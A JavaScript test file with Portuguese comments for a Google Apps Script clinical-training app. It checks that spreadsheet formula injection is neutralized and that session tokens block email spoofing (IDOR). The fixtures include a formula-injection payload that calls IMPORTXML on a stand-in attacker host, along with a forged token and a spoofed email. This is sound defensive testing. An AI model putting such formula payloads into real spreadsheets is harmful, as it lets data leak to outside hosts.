// Testa plantao.gs: (1) neutralização de fórmula ao gravar texto do aluno na
// planilha (achado F7 da auditoria — CWE-1236), e (2) que avaliarPlantao só
// aceita um e-mail vindo de um token de sessão válido, nunca do campo
// dados.email enviado pelo cliente (achado F1 — fecha o IDOR do plantão).
//
// autenticacao.gs precisa estar carregado no MESMO sandbox porque plantao.gs
// agora chama emailAutenticado(dados) — exatamente como vai acontecer de
// verdade quando os dois arquivos estiverem colados no mesmo projeto do
// Apps Script.

import fs from 'fs'
import vm from 'vm'
import crypto from 'crypto'

const ARQ_AUTH = new URL('./autenticacao.gs', import.meta.url).pathname
const ARQ_PLANTAO = new URL('./plantao.gs', import.meta.url).pathname

function paraBytesComSinal(buffer) {
  return Array.from(buffer, b => (b > 127 ? b - 256 : b))
}
function paraBufferSemSinal(bytes) {
  return Buffer.from(bytes.map(b => (b < 0 ? b + 256 : b)))
}

function montar(opcoes = {}) {
  const cacheStore = new Map()
  const cache = {
    get: (k) => (cacheStore.has(k) ? cacheStore.get(k) : null),
    put: (k, v) => cacheStore.set(k, v),
    remove: (k) => cacheStore.delete(k)
  }
  const props = { SESSION_SECRET: 'segredo-de-teste-bem-longo' }
  const logs = []
  const linhasGravadas = []   // o que appendRow recebeu, por planilha
  const respostaGroq = opcoes.respostaGroq || JSON.stringify({
    nota: 8, nota_componentes: { priorizacao: 8, conducao: 8, seguranca: 8, adaptacao: 8 },
    pontos_fortes: 'Boa priorização', pontos_atencao: 'Nenhum', proximo_passo: 'Seguir plano'
  })

  const sandbox = {
    normalizarTexto: (v) => String(v === undefined || v === null ? '' : v).trim(),
    registrarLog: (tipo, e, c, a, mensagem, detalhes) => logs.push({ tipo, email: e, mensagem, detalhes }),
    enviarEmailZoho: () => {},
    CacheService: { getScriptCache: () => cache },
    PropertiesService: { getScriptProperties: () => ({ getProperty: (k) => (k in props ? props[k] : null) }) },
    Utilities: {
      DigestAlgorithm: { SHA_256: 'SHA_256' },
      computeDigest: (algo, str) => paraBytesComSinal(crypto.createHash('sha256').update(str, 'utf8').digest()),
      computeHmacSha256Signature: (str, chave) => paraBytesComSinal(crypto.createHmac('sha256', chave).update(str, 'utf8').digest()),
      base64Encode: (bytes) => paraBufferSemSinal(bytes).toString('base64'),
      base64EncodeWebSafe: (valor) => {
        const buf = typeof valor === 'string' ? Buffer.from(valor, 'utf8') : paraBufferSemSinal(valor)
        return buf.toString('base64').replace(/\+/g, '-').replace(/\//g, '_').replace(/=+$/, '')
      },
      base64DecodeWebSafe: (str) => {
        const b64 = str.replace(/-/g, '+').replace(/_/g, '/')
        return paraBytesComSinal(Buffer.from(b64, 'base64'))
      },
      newBlob: (bytes) => ({ getDataAsString: () => paraBufferSemSinal(bytes).toString('utf8') }),
      getUuid: () => 'uuid-teste'
    },
    // Dependências que vivem no Codigo.gs (fora deste repositório) — mocks
    // simples, só o suficiente para exercitar a lógica própria do plantao.gs.
    PERFIS_CLINICOS: {
      Ansioso: { nome: 'Ansioso', descricao: 'Fala rápido, antecipa o pior.', resistencias: ['minimiza', 'interrompe'] }
    },
    chamarGroqAPI: () => respostaGroq,
    extrairJSONRobusto: (texto) => JSON.parse(texto),
    validarNota: (n) => Math.max(0, Math.min(10, Number(n) || 0)),
    round1: (n) => Math.round(Number(n) * 10) / 10,
    garantirTexto: (v, fallback) => (v && String(v).trim()) || fallback,
    getOrCreateSheet: (nome) => ({
      appendRow: (linha) => linhasGravadas.push({ sheet: nome, linha })
    }),
    Date, Math, String, Number, JSON, RegExp, Object,
  }
  vm.createContext(sandbox)
  vm.runInContext(fs.readFileSync(ARQ_AUTH, 'utf8'), sandbox)
  vm.runInContext(fs.readFileSync(ARQ_PLANTAO, 'utf8'), sandbox)
  return { sandbox, logs, linhasGravadas, props }
}

let falhas = 0
function checar(nome, ok, detalhe) {
  if (!ok) falhas++
  console.log(`${ok ? 'PASS' : 'FALHA'} — ${nome}${detalhe ? '\n   ' + detalhe : ''}`)
}

// ── neutralizarFormula: CWE-1236 ─────────────────────────────────────────────
{
  const t = montar()
  const nf = t.sandbox.neutralizarFormula
  checar('"=" na frente ganha apóstrofo', nf('=IMPORTXML("x","y")') === "'=IMPORTXML(\"x\",\"y\")")
  checar('"+" na frente ganha apóstrofo', nf('+1+1') === "'+1+1")
  checar('"-" na frente ganha apóstrofo', nf('-1') === "'-1")
  checar('"@" na frente ganha apóstrofo (menções no Sheets)', nf('@alguem') === "'@alguem")
  checar('texto normal não é alterado', nf('Acolhi a queixa e propus um exercício.') === 'Acolhi a queixa e propus um exercício.')
  checar('"=" no MEIO do texto não é alterado (só perigoso na primeira posição)',
    nf('o resultado foi = 8') === 'o resultado foi = 8')
  checar('undefined/null viram string vazia, não "undefined"', nf(undefined) === '' && nf(null) === '')
}

// ── avaliarPlantao: exige token válido (fecha o IDOR — achado F1) ──────────
{
  const t = montar()
  const r = t.sandbox.avaliarPlantao({ curso: 'Practitioner', id_plantao: 'x', numero: 1, perfil: 'Ansioso', resposta: 'texto' })
  checar('sem token: erro, não avalia nada', r.erro === true && /sessão ausente/i.test(r.mensagem), JSON.stringify(r))
  checar('sem token: nada é gravado na planilha', t.linhasGravadas.length === 0)
}

{
  const t = montar()
  const r = t.sandbox.avaliarPlantao({ token: 'lixo.assinatura-forjada', curso: 'Practitioner', id_plantao: 'x', numero: 1, perfil: 'Ansioso', resposta: 'texto' })
  checar('token inválido: erro, não avalia nada', r.erro === true && /sessão inválida/i.test(r.mensagem), JSON.stringify(r))
}

// ── avaliarPlantao: usa o e-mail do TOKEN, ignora dados.email do cliente ───
{
  const t = montar()
  const tokenVitima = t.sandbox.emitirTokenSessao('vitima@exemplo.com')
  const resposta = 'Primeiro acolho a queixa, checo sinais de risco e proponho um plano curto e objetivo para o caso.'
  const r = t.sandbox.avaliarPlantao({
    token: tokenVitima,
    email: 'atacante@exemplo.com',   // tentativa de se passar por outro e-mail
    curso: 'Practitioner', id_plantao: 'turno-1', numero: 1, perfil: 'Ansioso',
    queixa: 'Chega agitado.', resposta, tempo_seg: 200, expirou: false
  })
  checar('avaliação é concluída com sucesso', r.sucesso === true, JSON.stringify(r))
  const linha = t.linhasGravadas.find(l => l.sheet === 'Plantao_Historico')
  checar('a linha gravada usa o e-mail do TOKEN, não o "email" forjado no payload',
    !!linha && linha.linha[1] === 'vitima@exemplo.com', JSON.stringify(linha))
}

// ── salvarCasoPlantao: resposta com fórmula é neutralizada antes de gravar ──
{
  const t = montar()
  const token = t.sandbox.emitirTokenSessao('aluno@exemplo.com')
  const respostaMaliciosa = '=IMPORTXML("https://atacante.example/x","//a")'
  const r = t.sandbox.avaliarPlantao({
    token, curso: 'Practitioner', id_plantao: 'turno-2', numero: 1, perfil: 'Ansioso',
    queixa: 'Chega agitado.', resposta: respostaMaliciosa, tempo_seg: 200, expirou: false
  })
  checar('avaliação prossegue normalmente mesmo com payload malicioso', r.sucesso === true, JSON.stringify(r))
  const linha = t.linhasGravadas.find(l => l.sheet === 'Plantao_Historico')
  const respostaGravada = linha.linha[9]   // coluna "resposta"
  checar('a resposta gravada NÃO começa mais com "=" (fórmula neutralizada)',
    respostaGravada.startsWith("'="), respostaGravada)
  checar('o texto original continua presente após o apóstrofo', respostaGravada.includes('IMPORTXML'))
}

// ── caso de resposta curta (sem chamar a IA) também neutraliza antes de gravar ─
{
  const t = montar()
  const token = t.sandbox.emitirTokenSessao('aluno@exemplo.com')
  const r = t.sandbox.avaliarPlantao({
    token, curso: 'Practitioner', id_plantao: 'turno-3', numero: 1, perfil: 'Ansioso',
    resposta: '=curta', tempo_seg: 5, expirou: false
  })
  checar('resposta curta: registrada como não respondida, sem erro', r.sucesso === true && r.respondido === false)
  const linha = t.linhasGravadas.find(l => l.sheet === 'Plantao_Historico')
  checar('mesmo no caminho de "resposta curta", o texto é neutralizado',
    linha.linha[9].startsWith("'="), linha.linha[9])
}

console.log(falhas === 0 ? '\nTodos os testes passaram.' : `\n${falhas} falha(s).`)
process.exit(falhas === 0 ? 0 : 1)
